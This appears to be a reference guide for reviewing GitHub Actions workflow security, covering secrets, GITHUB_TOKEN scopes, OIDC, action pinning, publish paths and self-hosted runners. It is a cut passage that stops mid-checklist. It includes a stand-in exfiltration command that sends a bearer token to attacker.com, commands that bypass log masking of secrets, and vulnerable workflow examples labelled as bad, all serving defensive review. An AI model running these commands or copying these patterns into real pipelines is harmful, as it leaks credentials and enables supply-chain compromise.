<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# Secrets, tokens, OIDC, and self-hosted runners

## When to use

Load this reference when the workflow under review:

- Reads `secrets.*`, organization secrets, or environment secrets.
- Uses `GITHUB_TOKEN` with non-default `permissions:` (anything beyond `contents: read`).
- Requests OIDC tokens (`id-token: write`, `permissions.id-token`, `getIDToken`, `actions/configure-aws-credentials`, `google-github-actions/auth`, `azure/login`, etc.).
- Publishes packages, signs artifacts, creates releases, deploys, or pushes images.
- Pins third-party actions in jobs that have any of the above.
- Targets `runs-on:` self-hosted, ARC, or named runner labels.

## Contents

1. The exposure model: what a privileged job exposes
2. Secret and token exfiltration sinks
3. `GITHUB_TOKEN` permission scoping
4. OIDC token misuse
5. Third-party action pinning in privileged jobs
6. Publish, release, sign, and deploy paths
7. Self-hosted runner exposure
8. Decision checklists
9. False-positive traps

---

## 1. The exposure model: what a privileged job exposes

Once attacker-influenced code executes inside a job, **everything reachable from that job's process tree is exfiltratable**. The reachable set is:

| Surface | How it leaks |
| --- | --- |
| `secrets.*` injected via `env:` or step args | `printenv`, `env`, reading `/proc/self/environ`, child processes |
| `GITHUB_TOKEN` | `$GITHUB_TOKEN` env, `Authorization` headers in `gh`/`hub`, the runner's local token endpoint, `~/.gitconfig` after `actions/checkout` with `persist-credentials: true` |
| OIDC token | `ACTIONS_ID_TOKEN_REQUEST_URL` + `ACTIONS_ID_TOKEN_REQUEST_TOKEN` env vars, callable from any step |
| Files on disk | Cached credentials in `$HOME` (`~/.npmrc`, `~/.docker/config.json`, `~/.aws/credentials`, kubeconfigs, gcloud ADC) |
| Network | Outbound egress to attacker-controlled hosts |
| Self-hosted runner host | Persisted state, neighboring jobs, host network, mounted volumes |

**Rule:** if attacker-influenced code reaches a job, treat every item above as compromised. The exploit chain ends at "credential exfil" or "host compromise"; do not require evidence of the actual exfil syscall.

---

## 2. Secret and token exfiltration sinks

### Direct exposure to untrusted code

Bad — secret reaches a step that runs PR-controlled or attacker-influenced code:

```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR code
      - run: npm ci && npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}            # leaked
```

The PR's `package.json`, `npm test`, postinstall scripts, or any imported dep can read `NPM_TOKEN`.

### Indirect exposure via `actions/checkout` token persistence

`actions/checkout` defaults to `persist-credentials: true`, writing the token to `.git/config`. Any subsequent step that runs PR code can read it.

### Logging and artifact leaks

| Pattern | Why it leaks |
| --- | --- |
| `echo "$SECRET"` | GHA masks known secrets in logs, but transformations (base64, hex, partial) bypass masking |
| `env > artifact.txt` then `actions/upload-artifact` | masking does not apply to artifacts |
| `set -x` with secret in argv | argv may be logged before masking applies |
| `curl -H "Authorization: Bearer $TOKEN" attacker.com` | exfiltrates regardless of masking |
| Secret passed to a third-party action's input | the action sees the unmasked value and can do anything |

### Mask-bypass via transformation

Treat any of these as exfil capability when reachable from untrusted code:

- `echo $SECRET | base64`
- `echo $SECRET | rev`
- `echo ${SECRET:0:10}` (partial slices)
- `printf '%s' "$SECRET" | xxd`

Masking only catches the exact secret string.

---

## 3. `GITHUB_TOKEN` permission scoping

`GITHUB_TOKEN` is a credential. Its capability is determined by `permissions:` at workflow or job scope.

### Defaults that matter

- Default permissions are repo-configurable; do not assume `contents: read`.
- Omitting `permissions:` means "use repo default", which may grant write.
- Workflow-level `permissions:` applies to all jobs unless a job overrides.
- Job-level `permissions:` overrides workflow-level (does not merge).

### Dangerous combinations

| Permission | Why it matters when reached by untrusted code |
| --- | --- |
| `contents: write` | push to branches, tag, mutate refs |
| `pull-requests: write` | open/merge PRs, leave approving reviews |
| `issues: write` | comment as the bot, close issues |
| `packages: write` | publish to GHCR / GitHub Packages |
| `id-token: write` | mint OIDC tokens for cloud federation |
| `actions: write` | dispatch workflows, delete runs/artifacts |
| `deployments: write` | create deployments that may trigger downstream |
| `attestations: write` | sign supply-chain attestations |

### Reporting rule

A finding requires a path from untrusted input → step that uses or exposes the token. Broad `permissions: write-all` alone is **not** a finding (see false-positive traps); broad permissions plus a traced injection sink in the same job is high severity.

---

## 4. OIDC token misuse

`id-token: write` lets a job mint OIDC JWTs that cloud providers trust to issue temporary credentials.

### Exploit shapes

1. **Untrusted code in a job with `id-token: write`** — attacker calls `getIDToken()` and federates to AWS/GCP/Azure as the workflow's bound role. Severity is what that role can do, not what the workflow does.
2. **Overly permissive trust policies on the cloud side** — out of scope for workflow review, but flag the workflow's federation if the `subject` claim it relies on is attacker-influenceable (e.g., subject includes `head_ref` and `head_ref` is forkable).
3. **Reusable workflows with `id-token: write` exposed to untrusted callers** — a `workflow_call` that mints OIDC tokens hands cloud creds to whatever caller invokes it.
4. **OIDC subject claim manipulation** — `job_workflow_ref`, `ref`, and `environment` end up in the JWT `sub`. If the cloud side allows `ref:refs/heads/*`, any branch (including from a fork that gets merged briefly, or a maintainer typo) federates.

### Sub-claim audit

When reviewing OIDC, check what subject pattern the deploy targets trust. If you cannot see the cloud side, recommend that the workflow request `audience:` and `subject_claims:` that include `environment` (gated by required reviewers) rather than just `ref`.

### Red flags

- `id-token: write` at workflow scope (applies to every job, including any job that runs untrusted code).
- `id-token: write` on a job that also checks out PR head, runs tests, or invokes third-party actions pinned by tag.

---

## 5. Third-party action pinning in privileged jobs

In any job with secrets, write tokens, OIDC, runner privilege, or publish capability, **pin third-party `uses:` by full 40-char commit SHA**.

### Pinning categories

| Pin form | Mutable? | Safe in privileged job? |
| --- | --- | --- |
| `owner/action@v1` (major tag) | yes — owner can re-tag | no |
| `owner/action@v1.2.3` (full tag) | yes — tags can be force-pushed | no |
| `owner/action@main` / branch | yes | no |
| `owner/action@<40-char SHA>` | no | yes |
| `actions/*` (GitHub-owned) | tags acceptable per most threat models | usually yes; still prefer SHA for highest-risk jobs |
| `./local-action` | repo-controlled | yes (but review its source) |

### Decision rule

A privileged job that uses `third-party/action@v2` is a finding **regardless of whether you can demonstrate that action is currently malicious**. The exploit chain is: action owner (or anyone who phishes their npm/GitHub creds) pushes a new commit, re-tags `v2`, your next run executes it with full privilege.

### Composite/Docker action specifics

- Composite actions: review their `action.yml` `runs.steps` for the same injection patterns. They inherit the calling job's secrets.
- Docker actions: the image is pulled at run time. `image: 'docker://owner/img:latest'` has the same mutability problem; require digest pin (`@sha256:...`).
- JavaScript actions: their `node_modules` is committed to the action repo; pinning by SHA freezes the dep tree.

---

## 6. Publish, release, sign, and deploy paths

These jobs are top-severity targets. The exploit chain is `untrusted/caller-controlled input → publish sink → supply chain compromise`.

### Sinks to identify

| Sink | What gets compromised |
| --- | --- |
| `npm publish`, `yarn publish`, `pnpm publish` | npm registry package |
| `cargo publish`, `gem push`, `twine upload`, `mvn deploy` | language registries |
| `docker push`, `buildx build --push` | container registry |
| `gh release create`, `softprops/action-gh-release` | GitHub release artifacts |
| `cosign sign`, `slsa-github-generator` | signed attestations |
| `aws s3 cp`, `gsutil cp`, `kubectl apply`, `terraform apply` | deploy targets |
| `git tag`, `git push --tags` (on protected ref) | release tags |

### Common dangerous shapes

**Caller-controlled version/tag:**

```yaml
on:
  workflow_call:
    inputs:
      version: { type: string }
jobs:
  publish:
    steps:
      - run: npm version ${{ inputs.version }} && npm publish
        env: { NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }} }
```

A less-privileged caller (or PR-influenceable caller) controls what gets published.

**Release notes from PR body / commit messages:**

```yaml
- run: gh release create v1.0 --notes "${{ github.event.pull_request.body }}"
```

Beyond expression injection (covered elsewhere), the release body itself can include malicious links/scripts published as official.

**Deploy from PR-controlled artifacts:**

```yaml
on: workflow_run
jobs:
  deploy:
    steps:
      - uses: actions/download-artifact@v4
      - run: aws s3 cp ./dist/ s3://prod/ --recursive
```

Artifacts from a fork-PR upstream run are attacker-controlled. Severity: production tampering.

### Mitigation patterns

- Gate publish/deploy behind `environment:` with required reviewers.
- Source version/tag from `github.ref` (a protected tag), not from inputs.
- Verify artifacts (signatures, checksums against a trusted source) before deploying.
- Split: a `workflow_call` consumer should compute version itself from the immutable trigger, not accept it as input.

---

## 7. Self-hosted runner exposure

A self-hosted runner is a long-lived host. Untrusted code on it = host compromise, not just CI compromise.

### Why self-hosted is different from `ubuntu-latest`

| Property | GitHub-hosted | Self-hosted (default) |
| --- | --- | --- |
| Lifetime | per-job VM, destroyed | host persists across jobs |
| Filesystem | clean | accumulates state from prior jobs |
| Network | egress-only, ephemeral IP | often inside corporate network |
| Other tenants | none on your VM | your other repos/orgs share it |
| Cached credentials | none | `~/.docker`, `~/.aws`, etc. linger |
| Process isolation | VM | shell |

### Exploit shapes

1. **Self-hosted on a public repo without ephemerality** — first PR from a fork lands on the runner; attacker pivots to internal network, plants persistent backdoor, exfiltrates state from prior jobs.
2. **Self-hosted on a private repo with `pull_request_target` checking out PR head** — same path, different trigger.
3. **Self-hosted with chatops** — comment from any user runs on the host.
4. **Reusable workflow that does not constrain `runs-on:`** — caller can specify a self-hosted label and inherit the callee's secrets.

### What "safe self-hosted" looks like

- Ephemeral runners (ARC, `--ephemeral`, fresh VM per job) — required for any public-trigger reachability.
- Runner group restricted to specific repos, with public PRs explicitly disabled.
- No persistent volumes; no shared cache across jobs.
- Network egress restricted; no inbound to corp resources from runner subnet.
- `runs-on:` label that cannot be selected by a fork.

### Reporting rule

If a workflow reachable from `pull_request`, `pull_request_target`, `issue_comment`, `discussion`, or any other public-actor-triggerable event lands on a self-hosted runner without explicit ephemerality, that is a high-or-critical finding regardless of whether you also find a code-execution sink — the runner itself is the privilege.

For private-repo-only self-hosted, focus on the code-execution path; severity is still elevated because compromise crosses host boundaries.

---

## 8. Decision checklists

### For every secret/token-using step

- [ ] What untrusted input reaches this job (event field, input, artifact, cache, caller)?
- [ ] Does any step between checkout and this step run untrusted code (test, lint, install, build, third-party action by tag)?
- [ ] If yes: is the secret in scope (env at job level, exported earlier, written to disk)?
- [ ] Does `actions/
